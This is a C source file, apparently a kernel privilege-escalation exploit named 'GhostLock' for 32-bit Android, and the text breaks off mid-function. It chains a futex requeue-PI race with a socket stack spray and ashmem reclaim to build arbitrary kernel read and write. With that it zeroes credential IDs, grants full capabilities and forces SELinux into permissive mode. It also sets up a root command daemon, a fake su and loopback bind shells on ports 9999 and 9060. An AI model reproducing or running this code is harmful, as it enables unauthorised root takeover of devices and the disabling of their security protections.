#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stddef.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <termios.h>
#include <time.h>
#include <unistd.h>

#include "gl_profile.h"

static struct gl_profile g_profile;

#define INIT_TASK (g_profile.init_task)
#define PI_TASK (g_profile.pi_task)
#define INIT_TASK_TASKS (INIT_TASK + g_profile.task_tasks_off)
#define TASK_TASKS_OFF (g_profile.task_tasks_off)
#define TASK_REAL_CRED_OFF (g_profile.task_real_cred_off)
#define TASK_CRED_OFF (g_profile.task_cred_off)
#define TASK_COMM_OFF (g_profile.task_comm_off)
#define ASHMEM_MISC_FOPS (g_profile.ashmem_misc_fops)
#define ASHMEM_FOPS (g_profile.ashmem_fops)
#define CONFIGFS_READ_FILE (g_profile.configfs_read_file)
#define CONFIGFS_WRITE_FILE (g_profile.configfs_write_file)
#define ASHMEM_NAME_LEN 256
#define ASHMEM_NAME_PREFIX_LEN 11u
#define __ASHMEMIOC 0x77
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
#define PAYLOAD_LEN 0x120
#define WAITER_CORE (g_profile.waiter_core)
#define CONSUMER_CORE (g_profile.consumer_core)
#define CONSUMER_DELAY_US (g_profile.consumer_delay_us)
#define ROOT_SOCK_NAME "ghostlock_root"
#define BIND_SHELL_PORT 9999
#define LM_SHELL_PORT 9060

#ifndef MCAST_JOIN_SOURCE_GROUP
#define MCAST_JOIN_SOURCE_GROUP 46
#endif
#define GROUP_SOURCE_REQ_LEN 0x104

static uint32_t f_wait, f_pi_target, f_pi_chain;
static atomic_int waiter_tid, waiter_ready, waiter_waiting, owner_started;
static atomic_int consumer_go, consumer_done, consumer_launch;
static uint8_t payload[PAYLOAD_LEN];
static int stamp_sock = -1;
static int root_listener = -1;
static char **g_argv;
static int g_tries = 1;
static const char *g_exec_script = NULL;

struct local_sched_attr {
    uint32_t size, policy;
    uint64_t flags;
    int32_t nice;
    uint32_t priority;
    uint64_t runtime, deadline, period;
};

static void pin_core(unsigned core) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(core, &set);
    syscall(__NR_sched_setaffinity, 0, sizeof(set), &set);
}

static long set_nice(int tid, int nice) {
    struct local_sched_attr a;
    memset(&a, 0, sizeof(a));
    a.size = sizeof(a);
    a.policy = SCHED_BATCH;
    a.nice = nice;
    return syscall(__NR_sched_setattr, tid, &a, 0);
}

static void put_a32(unsigned off, uint32_t value) {
    *(uint32_t *)(payload + off) = value;
}

static int prepare_stack_stamp(void) {
    int type, proto;
    switch (g_profile.stamp_socket_kind) {
    case 1:
        type = SOCK_STREAM;
        proto = 0;
        break;
    case 2:
        type = SOCK_RAW;
        proto = IPPROTO_RAW;
        break;
    default:
        type = SOCK_DGRAM;
        proto = 0;
        break;
    }
    stamp_sock = socket(AF_INET6, type, proto);
    if (stamp_sock < 0)
        return 0;
    dprintf(2, "[stamp] socket kind=%u fd=%d copy_depth=%#x waiter_depth=%#x delta=%d\n",
            g_profile.stamp_socket_kind, stamp_sock, g_profile.stamp_copy_depth,
            g_profile.stamp_waiter_depth,
            (int)((int)g_profile.stamp_waiter_depth - (int)g_profile.stamp_copy_depth));
    return 1;
}

static void stamp_stack(void) {
    uint8_t buf[GROUP_SOURCE_REQ_LEN];
    memset(buf, 0, sizeof(buf));

    int delta = (int)g_profile.stamp_waiter_depth - (int)g_profile.stamp_copy_depth;
    unsigned covered = 0;
    for (int k = 0; k < (int)sizeof(buf); k++) {
        int j = k + delta;
        if (j >= 0 && j < 0x24) {
            buf[k] = payload[j];
            covered++;
        }
    }
    dprintf(2, "[stamp] copy armed delta=%d covered=%u (%s)\n", delta, covered,
            delta > 0 ? "tree_entry out of reach" : "full waiter image");
    atomic_store(&consumer_go, 1);
    while (!atomic_load(&consumer_launch))
        __asm__ volatile("yield" ::: "memory");
    for (unsigned long calls = 0; calls < 10000000ul && !atomic_load(&consumer_done); calls++)
        setsockopt(stamp_sock, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buf, sizeof(buf));
    for (;;)
        __asm__ volatile("yield" ::: "memory");
}

static void *waiter_fn(void *unused) {
    (void)unused;
    pin_core(WAITER_CORE);
    int tid = (int)syscall(__NR_gettid);
    atomic_store(&waiter_tid, tid);
    if (syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0)) {
        dprintf(2, "[w] LOCK_PI(chain) errno=%d\n", errno);
        return NULL;
    }
    atomic_store(&waiter_ready, 1);
    while (!atomic_load(&owner_started))
        usleep(1000);
    struct timespec timeout;
    syscall(__NR_clock_gettime, CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += 5;
    atomic_store(&waiter_waiting, 1);
    dprintf(2, "[w] WAIT_REQUEUE_PI\n");
    syscall(__NR_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
    dprintf(2, "[w] returned errno=%d; stamping\n", errno);
    syscall(__NR_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    stamp_stack();
    return NULL;
}

static void *owner_fn(void *unused) {
    (void)unused;
    if (syscall(__NR_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0)) {
        dprintf(2, "[o] LOCK_PI(target) errno=%d\n", errno);
        return NULL;
    }
    while (!atomic_load(&waiter_ready))
        usleep(1000);
    atomic_store(&owner_started, 1);
    dprintf(2, "[o] LOCK_PI(chain)\n");
    syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    for (;;)
        sleep(60);
}

static void *consumer_fn(void *unused) {
    (void)unused;
    pin_core(CONSUMER_CORE);
    int tid;
    while (!(tid = atomic_load(&waiter_tid)))
        usleep(1000);
    while (!atomic_load(&consumer_go)) {
    }
    dprintf(2, "[c] sched_setattr trigger tid=%d\n", tid);
    errno = 0;
    atomic_store(&consumer_launch, 1);
    usleep(CONSUMER_DELAY_US);
    long ret = set_nice(tid, 19);
    usleep(60000);
    dprintf(2, "[c] sched_setattr ret=%ld errno=%d\n", ret, errno);
    atomic_store(&consumer_done, 1);
    return NULL;
}

#define GL_SHELL_MAGIC "\x01GLSHELL"
#define GL_SHELL_MAGIC_LEN 8

static int root_connect(void) {
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    struct sockaddr_un sa;
    memset(&sa, 0, sizeof(sa));
    sa.sun_family = AF_UNIX;
    memcpy(sa.sun_path + 1, ROOT_SOCK_NAME, sizeof(ROOT_SOCK_NAME) - 1);
    socklen_t salen =
        (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + sizeof(ROOT_SOCK_NAME) - 1);
    if (fd < 0 || connect(fd, (struct sockaddr *)&sa, salen) < 0) {
        if (fd >= 0)
            close(fd);
        return -1;
    }
    return fd;
}

static int send_with_fds(int sock, const void *data, size_t len, const int *fds, int nfds) {
    struct msghdr msg;
    struct iovec iov;
    char control[CMSG_SPACE(sizeof(int) * 3)];
    memset(&msg, 0, sizeof(msg));
    memset(control, 0, sizeof(control));
    iov.iov_base = (void *)data;
    iov.iov_len = len;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    if (nfds > 0) {
        msg.msg_control = control;
        msg.msg_controllen = CMSG_SPACE(sizeof(int) * nfds);
        struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;
        cmsg->cmsg_len = CMSG_LEN(sizeof(int) * nfds);
        memcpy(CMSG_DATA(cmsg), fds, sizeof(int) * nfds);
    }
    return sendmsg(sock, &msg, 0) >= 0;
}

static ssize_t recv_with_fds(int sock, void *data, size_t len, int *fds, int *nfds) {
    struct msghdr msg;
    struct iovec iov;
    char control[CMSG_SPACE(sizeof(int) * 3)];
    memset(&msg, 0, sizeof(msg));
    iov.iov_base = data;
    iov.iov_len = len;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = control;
    msg.msg_controllen = sizeof(control);
    *nfds = 0;
    ssize_t n = recvmsg(sock, &msg, 0);
    if (n < 0)
        return n;
    for (struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg); cmsg; cmsg = CMSG_NXTHDR(&msg, cmsg)) {
        if (cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
            int count = (cmsg->cmsg_len - CMSG_LEN(0)) / sizeof(int);
            if (count > 3)
                count = 3;
            memcpy(fds, CMSG_DATA(cmsg), sizeof(int) * count);
            *nfds = count;
        }
    }
    return n;
}

static int root_client(int argc, char **argv) {
    int fd = root_connect();
    if (fd < 0) {
        dprintf(2, "connect @%s failed: %s\n", ROOT_SOCK_NAME, strerror(errno));
        return 1;
    }
    for (int i = 2; i < argc; i++) {
        if (i != 2)
            write(fd, " ", 1);
        write(fd, argv[i], strlen(argv[i]));
    }
    write(fd, "\n", 1);
    shutdown(fd, SHUT_WR);
    char buf[4096];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0)
        write(1, buf, (size_t)n);
    close(fd);
    return 0;
}

static int su_main(int argc, char **argv) {
    const char *cmd = NULL;
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-c") && i + 1 < argc) {
            cmd = argv[i + 1];
            break;
        }
        if (!strcmp(argv[i], "-") || !strcmp(argv[i], "-l") || !strcmp(argv[i], "root") ||
            !strcmp(argv[i], "0") || !strcmp(argv[i], "--login"))
            continue;
        if (argv[i][0] != '-') {
            cmd = argv[i];
            break;
        }
    }
    int fd = root_connect();
    if (fd < 0) {
        dprintf(2, "su: GhostLock root daemon not running\n");
        return 1;
    }
    if (cmd) {
        write(fd, cmd, strlen(cmd));
        write(fd, "\n", 1);
        shutdown(fd, SHUT_WR);
        char buf[4096];
        ssize_t n;
        while ((n = read(fd, buf, sizeof(buf))) > 0)
            write(1, buf, (size_t)n);
        close(fd);
        return 0;
    }

    char req[GL_SHELL_MAGIC_LEN + 4096];
    memcpy(req, GL_SHELL_MAGIC, GL_SHELL_MAGIC_LEN);
    size_t reqlen = GL_SHELL_MAGIC_LEN;
    if (getcwd(req + reqlen, sizeof(req) - reqlen))
        reqlen += strlen(req + reqlen);

    int master = posix_openpt(O_RDWR | O_NOCTTY);
    int slave = -1;
    if (master >= 0 && grantpt(master) == 0 && unlockpt(master) == 0) {
        char *sn = ptsname(master);
        if (sn)
            slave = open(sn, O_RDWR | O_NOCTTY);
    }
    if (slave < 0) {
        if (master >= 0)
            close(master);
        int fds[3] = {0, 1, 2};
        if (!send_with_fds(fd, req, reqlen, fds, 3)) {
            dprintf(2, "su: shell request failed: %s\n", strerror(errno));
            close(fd);
            return 1;
        }
        char b;
        while (read(fd, &b, 1) > 0) {
        }
        close(fd);
        return 0;
    }

    struct winsize ws;
    if (ioctl(0, TIOCGWINSZ, &ws) == 0)
        ioctl(slave, TIOCSWINSZ, &ws);
    struct termios oldt;
    int raw = 0;
    if (tcgetattr(0, &oldt) == 0) {
        struct termios rawt = oldt;
        cfmakeraw(&rawt);
        raw = tcsetattr(0, TCSANOW, &rawt) == 0;
    }

    int sfds[3] = {slave, slave, slave};
    if (!send_with_fds(fd, req, reqlen, sfds, 3)) {
        dprintf(2, "su: shell request failed: %s\n", strerror(errno));
        if (raw)
            tcsetattr(0, TCSANOW, &oldt);
        close(slave);
        close(master);
        close(fd);
        return 1;
    }
    close(slave);

    for (;;) {
        fd_set rf;
        FD_ZERO(&rf);
        FD_SET(0, &rf);
        FD_SET(master, &rf);
        FD_SET(fd, &rf);
        int mx = master > fd ? master : fd;
        if (select(mx + 1, &rf, NULL, NULL, NULL) < 0) {
            if (errno == EINTR)
                continue;
            break;
        }
        char buf[4096];
        ssize_t n;
        if (FD_ISSET(0, &rf)) {
            n = read(0, buf, sizeof(buf));
            if (n <= 0 || write(master, buf, (size_t)n) < 0)
                break;
        }
        if (FD_ISSET(master, &rf)) {
            n = read(master, buf, sizeof(buf));
            if (n <= 0)
                break;
            write(1, buf, (size_t)n);
        }
        if (FD_ISSET(fd, &rf)) {
            n = read(fd, buf, sizeof(buf));
            if (n <= 0)
                break;
        }
    }

    if (raw)
        tcsetattr(0, TCSANOW, &oldt);
    close(master);
    close(fd);
    return 0;
}

static int prepare_root_listener(void) {
    int s = socket(AF_UNIX, SOCK_STREAM, 0);
    struct sockaddr_un sa;
    memset(&sa, 0, sizeof(sa));
    sa.sun_family = AF_UNIX;
    memcpy(sa.sun_path + 1, ROOT_SOCK_NAME, sizeof(ROOT_SOCK_NAME) - 1);
    socklen_t salen =
        (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + sizeof(ROOT_SOCK_NAME) - 1);
    if (s < 0 || bind(s, (struct sockaddr *)&sa, salen) < 0 || listen(s, 4) < 0) {
        dprintf(2, "[-] root listener setup failed errno=%d\n", errno);
        if (s >= 0)
            close(s);
        return 0;
    }
    root_listener = s;
    dprintf(2, "[root] pre-bound command socket fd=%d\n", root_listener);
    fsync(2);
    return 1;
}

static void set_root_env(void) {
    setenv("PATH",
           "/sbin:/system/sbin:/system/bin:/system/xbin:/vendor/bin:/vendor/xbin:/data/local/tmp",
           1);
    setenv("HOME", "/data/local/tmp", 1);
    setenv("USER", "root", 1);
    setenv("LOGNAME", "root", 1);
    setenv("SHELL", "/system/bin/sh", 1);
    setenv("PS1", "sheldon:${PWD} # ", 1);
}

static void serve_shell(int client, const int *fds, int nfds, const char *cwd) {
    pid_t p = fork();
    if (p == 0) {
        setsid();
        for (int i = 0; i < nfds && i < 3; i++)
            dup2(fds[i], i);
        for (int i = 0; i < nfds; i++)
            if (fds[i] > 2)
                close(fds[i]);
        ioctl(0, TIOCSCTTY, 0);
        set_root_env();
        if (cwd && cwd[0] == '/' && chdir(cwd) == 0)
            setenv("PWD", cwd, 1);
        else if (chdir("/") == 0)
            setenv("PWD", "/", 1);
        execl("/system/bin/sh", "sh", (char *)NULL);
        _exit(127);
    }
    for (int i = 0; i < nfds; i++)
        close(fds[i]);
    close(client);
}

static void serve_command(int client, const char *cmd, const char *cwd) {
    pid_t p = fork();
    if (p == 0) {
        dup2(client, 0);
        dup2(client, 1);
        dup2(client, 2);
        if (client > 2)
            close(client);
        set_root_env();
        if (!(cwd && cwd[0] == '/' && chdir(cwd) == 0))
            chdir("/");
        execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }
    close(client);
}

static void root_server(void) {
    int s = root_listener;
    if (s < 0)
        _exit(111);
    signal(SIGCHLD, SIG_IGN);
    for (;;) {
        int c = accept(s, NULL, NULL);
        if (c < 0)
            continue;
        char buf[4096];
        int fds[3];
        int nfds = 0;
        ssize_t n = recv_with_fds(c, buf, sizeof(buf) - 1, fds, &nfds);
        if (n <= 0) {
            close(c);
            continue;
        }
        buf[n] = 0;
        if (nfds > 0 && n >= GL_SHELL_MAGIC_LEN && !memcmp(buf, GL_SHELL_MAGIC, GL_SHELL_MAGIC_LEN)) {
            const char *cwd = (n > GL_SHELL_MAGIC_LEN && buf[GL_SHELL_MAGIC_LEN])
                                  ? buf + GL_SHELL_MAGIC_LEN
                                  : NULL;
            serve_shell(c, fds, nfds, cwd);
        } else {
            serve_command(c, buf, NULL);
        }
    }
}

static int make_bind_listener(int port) {
    int ls = socket(AF_INET, SOCK_STREAM, 0);
    if (ls < 0)
        return -1;
    int one = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(port);
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (bind(ls, (struct sockaddr *)&a, sizeof(a)) != 0 || listen(ls, 4) != 0) {
        close(ls);
        return -1;
    }
    return ls;
}

static int open_pty_master(char *slave, size_t slave_len) {
    int master = posix_openpt(O_RDWR | O_NOCTTY);
    if (master < 0)
        return -1;
    if (grantpt(master) != 0 || unlockpt(master) != 0) {
        close(master);
        return -1;
    }
    if (ptsname_r(master, slave, slave_len) != 0) {
        close(master);
        return -1;
    }
    struct winsize ws;
    memset(&ws, 0, sizeof(ws));
    ws.ws_row = 24;
    ws.ws_col = 80;
    ioctl(master, TIOCSWINSZ, &ws);
    return master;
}

static void pump_pty(int sock, int master) {
    char buf[4096];
    for (;;) {
        struct pollfd p[2];
        p[0].fd = sock;
        p[0].events = POLLIN;
        p[0].revents = 0;
        p[1].fd = master;
        p[1].events = POLLIN;
        p[1].revents = 0;
        if (poll(p, 2, -1) < 0) {
            if (errno == EINTR)
                continue;
            return;
        }
        if (p[0].revents & POLLIN) {
            ssize_t n = read(sock, buf, sizeof(buf));
            if (n <= 0 || write(master, buf, (size_t)n) < 0)
                return;
        }
        if (p[1].revents & POLLIN) {
            ssize_t n = read(master, buf, sizeof(buf));
            if (n <= 0 || write(sock, buf, (size_t)n) < 0)
                return;
        }
        if ((p[0].revents | p[1].revents) & (POLLHUP | POLLERR | POLLNVAL))
            return;
    }
}

static void serve_bind_client_raw(int cs) {
    dup2(cs, 0);
    dup2(cs, 1);
    dup2(cs, 2);
    if (cs > 2)
        close(cs);
    set_root_env();
    execl("/system/bin/sh", "sh", (char *)NULL);
    _exit(127);
}

static void serve_bind_client(int cs) {
    char slave_name[128];
    int master = open_pty_master(slave_name, sizeof(slave_name));
    if (master < 0) {
        serve_bind_client_raw(cs);
        return;
    }
    signal(SIGCHLD, SIG_DFL);
    pid_t pid = fork();
    if (pid == 0) {
        setsid();
        int slave = open(slave_name, O_RDWR | O_NOCTTY);
        if (slave < 0)
            _exit(126);
        ioctl(slave, TIOCSCTTY, 0);
        dup2(slave, 0);
        dup2(slave, 1);
        dup2(slave, 2);
        if (slave > 2)
            close(slave);
        close(master);
        close(cs);
        set_root_env();
        setenv("TERM", "xterm-256color", 0);
        execl("/system/bin/sh", "sh", "-i", (char *)NULL);
        _exit(127);
    }
    if (pid > 0) {
        pump_pty(cs, master);
        kill(pid, SIGHUP);
        while (waitpid(pid, NULL, 0) < 0 && errno == EINTR) {
        }
    }
    close(master);
}

static int selinux_is_permissive(void) {
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd < 0)
        return 1;
    char c = '1';
    if (read(fd, &c, 1) < 0)
        c = '1';
    close(fd);
    return c == '0';
}

static void bind_shell_server(void) {
    for (int i = 0; i < 200 && !selinux_is_permissive(); i++)
        usleep(50000);
    int ls_pty = make_bind_listener(BIND_SHELL_PORT);
    int ls_lm = make_bind_listener(LM_SHELL_PORT);
    if (ls_pty < 0 && ls_lm < 0)
        return;
    signal(SIGCHLD, SIG_IGN);
    for (;;) {
        struct pollfd pf[2];
        pf[0].fd = ls_pty;
        pf[0].events = POLLIN;
        pf[0].revents = 0;
        pf[1].fd = ls_lm;
        pf[1].events = POLLIN;
        pf[1].revents = 0;
        if (poll(pf, 2, -1) <= 0)
            continue;
        for (int k = 0; k < 2; k++) {
            if (pf[k].fd < 0 || !(pf[k].revents & POLLIN))
                continue;
            int cs = accept(pf[k].fd, NULL, NULL);
            if (cs < 0)
                continue;
            int raw = (pf[k].fd == ls_lm);
            if (fork() == 0) {
                if (ls_pty >= 0)
                    close(ls_pty);
                if (ls_lm >= 0)
                    close(ls_lm);
                if (raw)
                    serve_bind_client_raw(cs);
                else
                    serve_bind_client(cs);
                _exit(0);
            }
            close(cs);
        }
    }
}

#include "gl_reclaim.h"

static void blob_u32(uint8_t *blob, unsigned object_off, uint32_t value) {
    memcpy(blob + object_off - ASHMEM_NAME_PREFIX_LEN, &value, sizeof(value));
}

static int set_name_no_zeros(int fd, const uint8_t *blob, size_t len) {
    char name[ASHMEM_NAME_LEN];
    memset(name, 'A', sizeof(name));
    for (size_t i = 0; i < len; i++)
        name[i] = blob[i] ? (char)blob[i] : 1;
    name[len] = 0;
    return ioctl(fd, ASHMEM_SET_NAME, name);
}

static int set_name_zero_at(int fd, const uint8_t *blob, size_t pos) {
    char name[ASHMEM_NAME_LEN];
    memset(name, 'A', sizeof(name));
    for (size_t i = 0; i < pos; i++)
        name[i] = blob[i] ? (char)blob[i] : 1;
    name[pos] = 0;
    return ioctl(fd, ASHMEM_SET_NAME, name);
}

static int set_ashmem_blob(int fd, const uint8_t *blob, size_t len) {
    if (set_name_no_zeros(fd, blob, len)) {
        dprintf(2, "[-] ASHMEM_SET_NAME initial len=%zu errno=%d\n", len, errno);
        return -1;
    }
    for (size_t i = len; i > 0; i--)
        if (!blob[i - 1] && set_name_zero_at(fd, blob, i - 1)) {
            dprintf(2, "[-] ASHMEM_SET_NAME zero pos=%zu errno=%d\n", i - 1, errno);
            return -1;
        }
    return 0;
}

static void forge_unlocked_mutex(uint8_t *blob) {

    unsigned m = g_profile.configfs_mutex_off;
    memset(blob + m - ASHMEM_NAME_PREFIX_LEN, 0, 0x18);
    blob_u32(blob, m, 1);
}

static uint32_t g_krw_pos;

static ssize_t kernel_write_once(int fd, uint32_t target, const void *data, size_t len) {
    uint8_t blob[96];
    memset(blob, 0x41, sizeof(blob));
    forge_unlocked_mutex(blob);

    blob_u32(blob, g_profile.configfs_page_off, target - 1);
    if (set_ashmem_blob(fd, blob, sizeof(blob)))
        return -1;

    long page_size = sysconf(_SC_PAGESIZE);
    if (page_size <= 0 || len + 1 >= (size_t)page_size) {
        errno = EINVAL;
        return -1;
    }
    uint8_t *fault =
        mmap(NULL, (size_t)page_size * 2, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (fault == MAP_FAILED ||
        mprotect(fault + page_size, (size_t)page_size, PROT_READ | PROT_WRITE)) {
        if (fault != MAP_FAILED)
            munmap(fault, (size_t)page_size * 2);
        return -1;
    }
    uint8_t *src = fault + page_size - 1;
    memcpy(src + 1, data, len);
    dprintf(2, "[krw] fault-write target=%08x payload=%zu count=%zu\n", target, len, len + 1);
    errno = 0;
    ssize_t ret = write(fd, src, len + 1);
    int saved_errno = errno;
    munmap(fault, (size_t)page_size * 2);
    if (ret < 0 && saved_errno == EFAULT)
        return (ssize_t)len;
    errno = saved_errno;
    return ret;
}

static ssize_t kernel_read_once(int fd, uint32_t target, void *data, size_t len) {
    uint8_t blob[96];
    memset(blob, 0x41, sizeof(blob));
    forge_unlocked_mutex(blob);

    blob_u32(blob, g_profile.configfs_page_off, target - g_krw_pos);
    blob_u32(blob, g_profile.configfs_needs_read_fill_off, 0);
    blob[g_profile.configfs_needs_read_fill_off + 4 - ASHMEM_NAME_PREFIX_LEN] = 0;
    blob[g_profile.configfs_needs_read_fill_off + 5 - ASHMEM_NAME_PREFIX_LEN] = 0;
    if (set_ashmem_blob(fd, blob, sizeof(blob)))
        return -1;
    errno = 0;
    ssize_t ret = read(fd, data, len);
    if (ret > 0)
        g_krw_pos += (uint32_t)ret;
    return ret;
}

static int kernel_zero_credential_ids(int fd, uint32_t cred) {
    uint8_t zeros[0x20] = {0};
    return kernel_write_once(fd, cred + 0x05, zeros, sizeof(zeros)) == (ssize_t)sizeof(zeros);
}

static int kernel_read_u32(int fd, uint32_t target, uint32_t *value);

static ssize_t kernel_write_data(int fd, uint32_t target, const void *data, size_t len) {
    uint8_t blob[96];
    memset(blob, 0x41, sizeof(blob));
    forge_unlocked_mutex(blob);
    blob_u32(blob, g_profile.configfs_page_off, target);
    if (set_ashmem_blob(fd, blob, sizeof(blob)))
        return -1;

    long page_size = sysconf(_SC_PAGESIZE);
    if (page_size <= 0 || len == 0 || len + 1 >= (size_t)page_size) {
        errno = EINVAL;
        return -1;
    }
    uint8_t *fault =
        mmap(NULL, (size_t)page_size * 2, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (fault == MAP_FAILED || mprotect(fault, (size_t)page_size, PROT_READ | PROT_WRITE)) {
        if (fault != MAP_FAILED)
            munmap(fault, (size_t)page_size * 2);
        return -1;
    }
    uint8_t *src = fault + page_size - len;
    memcpy(src, data, len);
    errno = 0;
    ssize_t ret = write(fd, src, len + 1);
    int saved_errno = errno;
    munmap(fault, (size_t)page_size * 2);
    if (ret < 0 && saved_errno == EFAULT)
        return (ssize_t)len;
    errno = saved_errno;
    return ret;
}

static int kernel_grant_full_caps(int fd, uint32_t cred) {
    static const uint32_t full[2] = {0xffffffffu, 0x0000003fu};
    return kernel_write_data(fd, cred + g_profile.cred_cap_permitted_off, full, sizeof(full)) ==
               (ssize_t)sizeof(full) &&
           kernel_write_data(fd, cred + g_profile.cred_cap_effective_off, full, sizeof(full)) ==
               (ssize_t)sizeof(full) &&
           kernel_write_data(fd, cred + g_profile.cred_cap_bset_off, full, sizeof(full)) ==
               (ssize_t)sizeof(full);
}

static int kernel_read_u32(int fd, uint32_t target, uint32_t *value);
static int kernel_ptr(uint32_t p);

#define SELINUX_STATUS_PAGE 0xc100c3e8u
#define GL_MEM_MAP 0xc1001ac4u
#define GL_PFN_OFFSET 0xc0f0bb44u
#define GL_VA_SUB 0x81000000u
#define GL_STATUS_BIAS 0x1000000u
#define GL_STATUS_SCAN_PAGES 8192

static int gl_status_page_va(int fd, uint32_t *out) {
    uint32_t page = 0, mem_map = 0, pfnoff = 0;
    if (!kernel_read_u32(fd, SELINUX_STATUS_PAGE, &page) || !kernel_ptr(page) ||
        !kernel_read_u32(fd, GL_MEM_MAP, &mem_map) || !kernel_ptr(mem_map) ||
        !kernel_read_u32(fd, GL_PFN_OFFSET, &pfnoff))
        return 0;
    *out = ((pfnoff + ((page - mem_map) >> 5)) << 12) - GL_VA_SUB;
    return 1;
}

static int kernel_set_permissive(int fd, uint32_t task) {
    (void)task;
    uint32_t before = 1, after = 1;
    kernel_read_u32(fd, g_profile.selinux_enforcing, &before);

    uint32_t uver = 0, uenf = 1, upol = 0, udeny = 0;
    int sfd = open("/sys/fs/selinux/status", O_RDONLY | O_CLOEXEC);
    if (sfd >= 0) {
        long pgsz = sysconf(_SC_PAGESIZE);
        volatile uint32_t *ust = mmap(NULL, (size_t)pgsz, PROT_READ, MAP_SHARED, sfd, 0);
        if (ust != MAP_FAILED) {
            uver = ust[0];
            uenf = ust[2];
            upol = ust[3];
            udeny = ust[4];
            munmap((void *)ust, (size_t)pgsz);
        }
        close(sfd);
    }

    uint32_t base = 0, kva = 0;
    int ok = 0;
    if (uver == 1 && gl_status_page_va(fd, &base) && kernel_ptr(base)) {
        uint32_t bpage = (base + GL_STATUS_BIAS) & ~0xfffu;
        for (int d = 0; d <= GL_STATUS_SCAN_PAGES && !ok; d++) {
            uint32_t cand[2];
            int nc = 0;
            cand[nc++] = bpage + (uint32_t)d * 0x1000u;
            if (d)
                cand[nc++] = bpage - (uint32_t)d * 0x1000u;
            for (int i = 0; i < nc && !ok; i++) {
                uint32_t c = cand[i], a0 = 0, a2 = 0, a3 = 0, a4 = 0, a5 = 0;
                if (kernel_ptr(c) && kernel_read_u32(fd, c, &a0) && a0 == 1 &&
                    kernel_read_u32(fd, c + 8, &a2) && a2 == uenf && kernel_read_u32(fd, c + 12, &a3) &&
                    a3 == upol && kernel_read_u32(fd, c + 16, &a4) && a4 == udeny &&
                    kernel_read_u32(fd, c + 20, &a5) && a5 == 0) {
                    kva = c;
                    ok = 1;
                }
            }
        }
    }
    dprintf(2, "[perm] status base=%08x kva=%08x ok=%d uver=%u uenf=%u upol=%u udeny=%u\n", base, kva,
            ok, uver, uenf, upol, udeny);

    if (ok) {
        uint32_t seq = 0;
        kernel_read_u32(fd, kva + 4, &seq);
        uint32_t s1 = seq + 1, s2 = seq + 2, zero32 = 0;
        kernel_write_data(fd, kva + 4, &s1, 4);
        kernel_write_data(fd, kva + 8, &zero32, 4);
        kernel_write_data(fd, kva + 4, &s2, 4);
    }

    uint8_t z3[3] = {0};
    kernel_write_once(fd, g_profile.selinux_enforcing + 1, z3, 3);
    kernel_read_u32(fd, g_profile.selinux_enforcing, &after);
    dprintf(2, "[perm] enforcing %u->%u; status %s\n", before, after, ok ? "updated" : "not-updated");
    fsync(2);
    return after == 0;
}

static int kernel_read_u32(int fd, uint32_t target, uint32_t *value) {
    return kernel_read_once(fd, target, value, sizeof(*value)) == sizeof(*value);
}

static int kernel_ptr(uint32_t p) {
    return p >= 0xc0000000u && p < 0xf0000000u && !(p & 3u);
}

static int validate_runtime_profile(int fd) {
    char comm[17] = {0};
    uint32_t next = 0, previous = 0;
    if (kernel_read_once(fd, INIT_TASK + TASK_COMM_OFF, comm, 16) != 16 ||
        strncmp(comm, "swapper", 7)) {
        dprintf(2, "[-] profile anchor failed: init task comm=%s\n", comm);
        return 0;
    }
    if (!kernel_read_u32(fd, INIT_TASK_TASKS, &next) ||
        !kernel_read_u32(fd, INIT_TASK_TASKS + 4, &previous) || !kernel_ptr(next) ||
        !kernel_ptr(previous)) {
        dprintf(2, "[-] profile anchor failed: task list next=%08x previous=%08x\n", next,
                previous);
        return 0;
    }
    dprintf(2, "[profile] runtime anchors verified: comm=%s next=%08x previous=%08x\n", comm, next,
            previous);
    return 1;
}

static uint32_t find_current_task(int fd) {
    char self_comm[17] = {0};
    prctl(PR_GET_NAME, self_comm, 0, 0, 0);
    uint32_t link = 0;
    if (!kernel_read_u32(fd, INIT_TASK_TASKS + 4, &link))
        return 0;
